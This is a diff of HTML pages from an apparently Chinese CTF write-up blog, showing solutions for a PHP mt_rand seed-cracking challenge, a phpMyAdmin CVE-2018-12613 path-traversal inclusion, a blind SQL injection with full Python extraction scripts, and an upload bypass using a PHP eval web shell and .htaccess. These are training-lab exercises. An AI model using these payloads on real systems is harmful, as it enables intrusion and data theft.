-<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er"><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er"><br>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er"><br>然后用php_mt_seed爆破：<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er"><br>得到的随机数直接用下面的脚本进行获取全面字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er"><br>将这段字符串提交得到flag。<br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er"></p>
-<hr>
-<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><br><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er">
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er">
+<p>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er">
+<p>然后用php_mt_seed爆破：</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er">
+<p>得到的随机数直接用下面的脚本进行获取全面字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er">
+<p>将这段字符串提交得到flag。</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er">
 
+<hr>
+<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er">
           
         
       
@@ -761,7 +973,14 @@
       
         
           
-            <p>检测通过测试发现在search.php页面存在sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><br>先写个判断数据库名的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><br>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><br><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er"></p>
+            <p>检测通过测试发现在search.php页面存在sql注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure>
+<p>先写个判断数据库名的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure>
+<p>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure>
+<img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er">
+
 
           
         
@@ -945,8 +1164,12 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br>上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php小马</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><br><img src="/GXYCTF2019-BabyUpload/2.png" class title="Da4er"><br><img src="/GXYCTF2019-BabyUpload/3.png" class title="Da4er"><br><img src="/GXYCTF2019-BabyUpload/4.png" class title="Da4er"></p>
-
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p>上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。</p>
